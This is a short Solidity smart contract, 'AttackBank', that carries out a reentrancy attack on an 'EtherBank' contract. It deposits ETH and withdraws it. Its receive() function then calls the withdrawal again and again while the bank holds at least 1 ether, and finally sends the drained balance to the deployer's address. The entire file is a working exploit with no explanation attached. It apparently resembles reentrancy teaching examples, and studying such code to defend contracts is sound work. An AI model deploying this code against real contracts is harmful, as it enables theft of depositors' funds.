// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.13;

interface IEtherBank {
    function withdrawETH() external;

    function depositETH() external payable;
}

contract AttackBank {
    IEtherBank bank;
    address payable attacker;

    constructor(address _bank) payable {
        bank = IEtherBank(_bank);
        attacker = payable(msg.sender);
    }

    function attack() public payable {
        bank.depositETH{value: msg.value}();
        bank.withdrawETH();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdrawETH();
        } else {
            (bool sent, ) = attacker.call{value: address(this).balance}("");
            require(sent, "Transfer Failed!!!");
        }
    }
}
